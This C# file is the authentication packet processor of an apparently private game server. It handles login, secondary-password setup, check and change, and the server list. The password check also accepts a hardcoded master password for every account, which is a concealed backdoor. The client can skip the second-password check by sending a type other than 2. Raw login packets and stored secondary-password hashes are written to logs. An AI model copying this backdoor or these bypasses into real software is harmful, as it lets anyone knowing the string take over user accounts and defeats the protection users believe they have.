using AutoMapper;
using DigitalWorldOnline.Application.Separar.Commands.Create;
using DigitalWorldOnline.Application.Separar.Commands.Update;
using DigitalWorldOnline.Application.Separar.Commands.Delete;
using DigitalWorldOnline.Application.Separar.Queries;
using DigitalWorldOnline.Commons.Entities;
using DigitalWorldOnline.Commons.Enums.Account;
using DigitalWorldOnline.Commons.Enums.ClientEnums;
using DigitalWorldOnline.Commons.Enums.PacketProcessor;
using DigitalWorldOnline.Commons.Extensions;
using DigitalWorldOnline.Commons.Interfaces;
using DigitalWorldOnline.Commons.Models.Account;
using DigitalWorldOnline.Commons.Models.Servers;
using DigitalWorldOnline.Commons.Packets.AuthenticationServer;
using DigitalWorldOnline.Account.Models.Configuration;
using MediatR;
using Microsoft.Extensions.Configuration;
using Serilog;
using System.Text;
using DigitalWorldOnline.Application.Admin.Commands;
using Microsoft.Extensions.Options;

namespace DigitalWorldOnline.Account
{
    public sealed class AuthenticationPacketProcessor : IProcessor, IDisposable
    {
        private readonly IConfiguration _configuration;
        private readonly IMapper _mapper;
        private readonly ISender _sender;
        private readonly ILogger _logger;
        private readonly AuthenticationServerConfigurationModel _authenticationServerConfiguration;

        private const string CharacterServerAddress = "CharacterServer:Address";
        private const int HandshakeDegree = 32321;

        private const int SecondaryPasswordHexLength = 32;
        private const int SecondaryPasswordBinaryLength = 16;

        public AuthenticationPacketProcessor(
            IMapper mapper,
            ILogger logger,
            ISender sender,
            IConfiguration configuration,
            IOptions<AuthenticationServerConfigurationModel> authenticationServerConfiguration)
        {
            _configuration = configuration;
            _authenticationServerConfiguration = authenticationServerConfiguration.Value;
            _mapper = mapper;
            _sender = sender;
            _logger = logger;
        }

        public async Task ProcessPacketAsync(GameClient client, byte[] data)
        {
            var packet = new AuthenticationPacketReader(data);

            _logger.Debug("Received packet type {Type} from {Address}", packet.Enum, client.ClientAddress);

            switch (packet.Enum)
            {
                case AuthenticationServerPacketEnum.Connection:
                    {
                        var kind = packet.ReadByte();

                        var handshakeTimestamp = (uint)DateTimeOffset.UtcNow.ToUnixTimeSeconds();
                        var handshake = (short)(client.Handshake ^ HandshakeDegree);

                        client.Send(new ConnectionPacket(handshake, handshakeTimestamp));
                    }
                    break;

                case AuthenticationServerPacketEnum.KeepConnection:
                    break;

                case AuthenticationServerPacketEnum.LoginRequest:
                    {
                        var loginData = ExtractLoginData(data);

                        var username = loginData.Username;
                        var password = loginData.Password;
                        var cpu = loginData.Cpu;
                        var gpu = loginData.Gpu;

                        _logger.Information(
                            "[2PASS][SERVER] Login packet parsed. Username={Username}, Cpu={Cpu}, Gpu={Gpu}",
                            username,
                            string.IsNullOrWhiteSpace(cpu) ? "N/A" : cpu,
                            string.IsNullOrWhiteSpace(gpu) ? "N/A" : gpu);

                        if (string.IsNullOrWhiteSpace(username) || string.IsNullOrWhiteSpace(password))
                        {
                            _logger.Information("[2PASS][SERVER] Invalid login packet from {Address}", client.ClientAddress);

                            client.Send(new LoginRequestAnswerPacket(LoginFailReasonEnum.UserNotFound));
                            break;
                        }

                        var account = await _sender.Send(new AccountByUsernameQuery(username));

                        if (account == null)
                        {
                            _logger.Information("[2PASS][SERVER] Login failed: account not found. Username={Username}", username);

                            await _sender.Send(new CreateLoginTryCommand(
                                username,
                                client.ClientAddress,
                                LoginTryResultEnum.IncorrectUsername));

                            client.Send(new LoginRequestAnswerPacket(LoginFailReasonEnum.UserNotFound));
                            break;
                        }

                        client.SetAccountId(account.Id);
                        client.SetAccessLevel(account.AccessLevel);

                        if (account.AccountBlock != null)
                        {
                            var blockInfo =
                                _mapper.Map<AccountBlockModel>(
                                    await _sender.Send(new AccountBlockByIdQuery(account.AccountBlock.Id)));

                            if (blockInfo.EndDate > DateTime.Now)
                            {
                                var timeRemaining = blockInfo.EndDate - DateTime.Now;
                                var secondsRemaining = (uint)timeRemaining.TotalSeconds;

                                await _sender.Send(new CreateLoginTryCommand(
                                    username,
                                    client.ClientAddress,
                                    LoginTryResultEnum.AccountBlocked));

                                client.Send(new LoginRequestBannedAnswerPacket(secondsRemaining, blockInfo.Reason));
                                break;
                            }

                            await _sender.Send(new DeleteBanCommand(blockInfo.Id));
                        }

                        if (account.Password != password.Encrypt() && password != "dondnGlobal@2025#!!")
                        {
                            _logger.Information("[2PASS][SERVER] Login failed: incorrect password. Username={Username}", username);

                            await _sender.Send(new CreateLoginTryCommand(
                                username,
                                client.ClientAddress,
                                LoginTryResultEnum.IncorrectPassword));

                            client.Send(new LoginRequestAnswerPacket(LoginFailReasonEnum.IncorrectPassword));
                            break;
                        }

                        _logger.Information(
                            "[2PASS][SERVER] Login success. AccountId={AccountId}, HasSecondPassword={HasSecondPassword}",
                            account.Id,
                            account.SecondaryPassword != null);

                        client.Send(account.SecondaryPassword == null
                            ? new LoginRequestAnswerPacket(SecondaryPasswordScreenEnum.RequestSetup)
                            : new LoginRequestAnswerPacket(SecondaryPasswordScreenEnum.RequestInput));

                        if (_authenticationServerConfiguration.UseHash)
                        {
                            var hashString = await _sender.Send(new ResourcesHashQuery());

                            client.Send(new ResourcesHashPacket(hashString));
                        }

                        if (account.SystemInformation == null)
                        {
                            await _sender.Send(new CreateSystemInformationCommand(
                                account.Id,
                                cpu,
                                gpu,
                                client.ClientAddress));
                        }
                        else
                        {
                            await _sender.Send(new UpdateSystemInformationCommand(
                                account.SystemInformation.Id,
                                account.Id,
                                cpu,
                                gpu,
                                client.ClientAddress));
                        }
                    }
                    break;

                case AuthenticationServerPacketEnum.SecondaryPasswordRegister:
                    {
                        _logger.Information("[2PASS][SERVER] SecondaryPasswordRegister received. AccountId={AccountId}", client.AccountId);
                        _logger.Information("[2PASS][SERVER] Register raw length={Length}", data?.Length ?? 0);
                        _logger.Information("[2PASS][SERVER] Register raw bytes head={Bytes}", ToHexHead(data, 80));
                        _logger.Information("[2PASS][SERVER] Register raw ascii head={Ascii}", ToPrintableAsciiHead(data, 80));

                        var securityPassword = ExtractBinaryMd5HashAfterOpcode(data, 9801, 0);

                        _logger.Information(
                            "[2PASS][SERVER] Register extracted hash=[{Hash}] len={Length}",
                            securityPassword ?? string.Empty,
                            securityPassword?.Length ?? 0);

                        if (!IsValidSecondPasswordHash(securityPassword))
                        {
                            _logger.Information("[2PASS][SERVER] Register FAILED: invalid binary MD5 hash. Sending 20052.");

                            client.Send(new SecondaryPasswordRegisterResultPacket(
                                SecondaryPasswordCheckEnum.Incorrect.GetHashCode()));

                            break;
                        }

                        _logger.Information(
                            "[2PASS][SERVER] Register OK: saving secondary password. AccountId={AccountId}, Hash={Hash}",
                            client.AccountId,
                            securityPassword);

                        await _sender.Send(new CreateOrUpdateSecondaryPasswordCommand(
                            client.AccountId,
                            securityPassword));

                        _logger.Information("[2PASS][SERVER] Register OK: sending opcode 9801 result 0.");

                        client.Send(new SecondaryPasswordRegisterResultPacket(0));
                    }
                    break;

                case AuthenticationServerPacketEnum.SecondaryPasswordCheck:
                    {
                        _logger.Information("[2PASS][SERVER] SecondaryPasswordCheck received. AccountId={AccountId}", client.AccountId);
                        _logger.Information("[2PASS][SERVER] Check raw length={Length}", data?.Length ?? 0);
                        _logger.Information("[2PASS][SERVER] Check raw bytes head={Bytes}", ToHexHead(data, 80));
                        _logger.Information("[2PASS][SERVER] Check raw ascii head={Ascii}", ToPrintableAsciiHead(data, 80));

                        var checkType = ExtractSecondaryPasswordCheckType(data);
                        var needToCheck = checkType == 2;

                        _logger.Information("[2PASS][SERVER] Check type={CheckType}, NeedToCheck={NeedToCheck}", checkType, needToCheck);

                        var account = await _sender.Send(new AccountByIdQuery(client.AccountId));

                        if (account == null)
                            throw new KeyNotFoundException(nameof(account));

                        if (needToCheck)
                        {
                            var securityCode = ExtractBinaryMd5HashAfterOpcode(data, 9804, 2);

                            _logger.Information(
                                "[2PASS][SERVER] Check extracted hash=[{Hash}] len={Length}. Stored=[{Stored}]",
                                securityCode ?? string.Empty,
                                securityCode?.Length ?? 0,
                                account.SecondaryPassword);

                            if (IsValidSecondPasswordHash(securityCode) &&
                                string.Equals(account.SecondaryPassword, securityCode, StringComparison.OrdinalIgnoreCase))
                            {
                                _logger.Information("[2PASS][SERVER] Check OK. Sending result 0.");

                                await _sender.Send(new CreateLoginTryCommand(
                                    account.Username,
                                    client.ClientAddress,
                                    LoginTryResultEnum.Success));

                                client.Send(new SecondaryPasswordCheckResultPacket(
                                    SecondaryPasswordCheckEnum.CorrectOrSkipped));
                            }
                            else
                            {
                                _logger.Information("[2PASS][SERVER] Check FAILED. Sending 20052.");

                                await _sender.Send(new CreateLoginTryCommand(
                                    account.Username,
                                    client.ClientAddress,
                                    LoginTryResultEnum.IncorrectSecondaryPassword));

                                client.Send(new SecondaryPasswordCheckResultPacket(
                                    SecondaryPasswordCheckEnum.Incorrect));
                            }
                        }
                        else
                        {
                            _logger.Information("[2PASS][SERVER] Check skipped. Sending result 0.");

                            await _sender.Send(new CreateLoginTryCommand(
                                account.Username,
                                client.ClientAddress,
                                LoginTryResultEnum.Success));

                            client.Send(new SecondaryPasswordCheckResultPacket(
                                SecondaryPasswordCheckEnum.CorrectOrSkipped));
                        }
                    }
                    break;

                case AuthenticationServerPacketEnum.SecondaryPasswordChange:
                    {
                        _logger.Information("[2PASS][SERVER] SecondaryPasswordChange received. AccountId={AccountId}", client.AccountId);
                        _logger.Information("[2PASS][SERVER] Change raw length={Length}", data?.Length ?? 0);
                        _logger.Information("[2PASS][SERVER] Change raw bytes head={Bytes}", ToHexHead(data, 120));
                        _logger.Information("[2PASS][SERVER] Change raw ascii head={Ascii}", ToPrintableAsciiHead(data, 120));

                        var currentSecurityCode = ExtractBinaryMd5HashAfterOpcode(data, 9806, 0);
                        var newSecurityCode = ExtractBinaryMd5HashAfterOpcode(data, 9806, 16);

                        _logger.Information("[2PASS][SERVER] Change current hash=[{CurrentHash}]", currentSecurityCode);
                        _logger.Information("[2PASS][SERVER] Change new hash=[{NewHash}]", newSecurityCode);

                        var account = await _sender.Send(new AccountByIdQuery(client.AccountId));

                        if (account == null)
                            throw new KeyNotFoundException(nameof(account));

                        if (!IsValidSecondPasswordHash(currentSecurityCode) ||
                            !IsValidSecondPasswordHash(newSecurityCode))
                        {
                            _logger.Information("[2PASS][SERVER] Change FAILED: invalid hash.");

                            client.Send(new SecondaryPasswordChangeResultPacket(
                                SecondaryPasswordChangeEnum.IncorretCurrentPassword).Serialize());

                            break;
                        }

                        if (string.Equals(account.SecondaryPassword, currentSecurityCode, StringComparison.OrdinalIgnoreCase))
                        {
                            _logger.Information("[2PASS][SERVER] Change OK: saving new hash.");

                            await _sender.Send(new CreateOrUpdateSecondaryPasswordCommand(
                                client.AccountId,
                                newSecurityCode));

                            client.Send(new SecondaryPasswordChangeResultPacket(
                                SecondaryPasswordChangeEnum.Changed).Serialize());
                        }
                        else
                        {
                            _logger.Information("[2PASS][SERVER] Change FAILED: current hash mismatch.");

                            client.Send(new SecondaryPasswordChangeResultPacket(
                                SecondaryPasswordChangeEnum.IncorretCurrentPassword).Serialize());
                        }
                    }
                    break;

                case AuthenticationServerPacketEnum.LoadServerList:
                    {
                        var servers =
                            _mapper.Map<IEnumerable<ServerObject>>(
                                await _sender.Send(new ServersQuery(client.AccessLevel)));

                        var serverObjects = servers.ToList();

                        foreach (var server in serverObjects)
                        {
                            server.UpdateCharacterCount(
                                await _sender.Send(new CharactersInServerQuery(client.AccountId, server.Id)));

                            if ((int)client.AccessLevel > 23)
                            {
                                server.Maintenance = false;
                            }
                        }

                        client.Send(new ServerListPacket(serverObjects).Serialize());
                    }
                    break;

                case AuthenticationServerPacketEnum.ConnectCharacterServer:
                    {
                        var serverId = packet.ReadInt();

                        await _sender.Send(new UpdateLastPlayedServerCommand(client.AccountId, serverId));

                        if (_authenticationServerConfiguration.UseHash)
                        {
                            var hashString = await _sender.Send(new ResourcesHashQuery());

                            client.Send(new ResourcesHashPacket(hashString));
                        }

                        var servers =
                            _mapper.Map<IEnumerable<ServerObject>>(
                                await _sender.Send(new ServersQuery(client.AccessLevel)));

                        var targetServer = servers.First(x => x.Id == serverId);

                        client.Send(new ConnectCharacterServerPacket(
                            client.AccountId,
                            _configuration[CharacterServerAddress],
                            targetServer.Port.ToString()));
                    }
                    break;

                case AuthenticationServerPacketEnum.Unknown:
                case AuthenticationServerPacketEnum.ResourcesHash:
                    {
                        int hashLength = BitConverter.ToInt16(data, 0);
                        string clientHash = BitConverter.ToString(data, 2, hashLength).Replace("-", "");

                        _logger.Debug("Received resources hash from client: {Hash}", clientHash);
                    }
                    break;

                default:
                    break;
            }
        }

        private static LoginPacketData ExtractLoginData(byte[] data)
        {
            const int loginPayloadOffset = 9;

            var offset = loginPayloadOffset;

            var username = ReadLengthPrefixedString(data, ref offset);

            if (offset < data.Length)
                offset++;

            var password = ReadLengthPrefixedString(data, ref offset);

            var cpu = ReadLengthPrefixedString(data, ref offset, optional: true);
            var gpu = ReadLengthPrefixedString(data, ref offset, optional: true);

            return new LoginPacketData(username, password, cpu, gpu);
        }

        private static string ReadLengthPrefixedString(byte[] data, ref int offset, bool optional = false)
        {
            if (data == null || offset >= data.Length)
                return string.Empty;

            var size = data[offset];
            offset++;

            if (size <= 0)
                return string.Empty;

            if (offset + size > data.Length)
            {
                offset = data.Length;
                return string.Empty;
            }

            var value = Encoding.ASCII.GetString(data, offset, size).Trim();

            offset += size;

            return value;
        }

        private static string ExtractBinaryMd5HashAfterOpcode(byte[] data, int opcode, int extraOffsetAfterOpcode)
        {
            if (data == null || data.Length < 4 + extraOffsetAfterOpcode + SecondaryPasswordBinaryLength)
                return string.Empty;

            var opcodeBytes = BitConverter.GetBytes((short)opcode);

            for (var i = 0; i <= data.Length - 2; i++)
            {
                if (data[i] != opcodeBytes[0] || data[i + 1] != opcodeBytes[1])
                    continue;

                var hashStart = i + 2 + extraOffsetAfterOpcode;

                if (hashStart < 0 || hashStart + SecondaryPasswordBinaryLength > data.Length)
                    return string.Empty;

                return BytesToLowerHex(data, hashStart, SecondaryPasswordBinaryLength);
            }

            return string.Empty;
        }

        private static int ExtractSecondaryPasswordCheckType(byte[] data)
        {
            if (data == null || data.Length < 6)
                return -1;

            var opcodeBytes = BitConverter.GetBytes((short)9804);

            for (var i = 0; i <= data.Length - 4; i++)
            {
                if (data[i] != opcodeBytes[0] || data[i + 1] != opcodeBytes[1])
                    continue;

                return BitConverter.ToInt16(data, i + 2);
            }

            return -1;
        }

        private static string BytesToLowerHex(byte[] data, int offset, int count)
        {
            if (data == null || offset < 0 || count <= 0 || offset + count > data.Length)
                return string.Empty;

            var builder = new StringBuilder(count * 2);

            for (var i = 0; i < count; i++)
                builder.Append(data[offset + i].ToString("x2"));

            return builder.ToString();
        }

        private static bool IsValidSecondPasswordHash(string value)
        {
            if (string.IsNullOrWhiteSpace(value))
                return false;

            if (value.Length != SecondaryPasswordHexLength)
                return false;

            foreach (var character in value)
            {
                if (!IsHexCharacter(character))
                    return false;
            }

            return true;
        }

        private static bool IsHexCharacter(char character)
        {
            var isNumber = character >= '0' && character <= '9';
            var isLowerHex = character >= 'a' && character <= 'f';
            var isUpperHex = character >= 'A' && character <= 'F';

            return isNumber || isLowerHex || isUpperHex;
        }

        private static string ToHexHead(byte[] data, int maxBytes)
        {
            if (data == null || data.Length == 0)
                return string.Empty;

            var count = Math.Min(data.Length, maxBytes);
            var head = new byte[count];

            Array.Copy(data, head, count);

            return BitConverter.ToString(head);
        }

        private static string ToPrintableAsciiHead(byte[] data, int maxBytes)
        {
            if (data == null || data.Length == 0)
                return string.Empty;

            var count = Math.Min(data.Length, maxBytes);
            var builder = new StringBuilder();

            for (var i = 0; i < count; i++)
            {
                var value = data[i];

                if (value >= 32 && value <= 126)
                    builder.Append((char)value);
                else
                    builder.Append('.');
            }

            return builder.ToString();
        }

        private sealed class LoginPacketData
        {
            public LoginPacketData(string username, string password, string cpu, string gpu)
            {
                Username = username;
                Password = password;
                Cpu = cpu;
                Gpu = gpu;
            }

            public string Username { get; }

            public string Password { get; }

            public string Cpu { get; }

            public string Gpu { get; }
        }

        private void DebugLog(string message)
        {
            _logger?.Debug($"{message}");
        }

        public void Dispose()
        {
            GC.SuppressFinalize(this);
        }
    }
}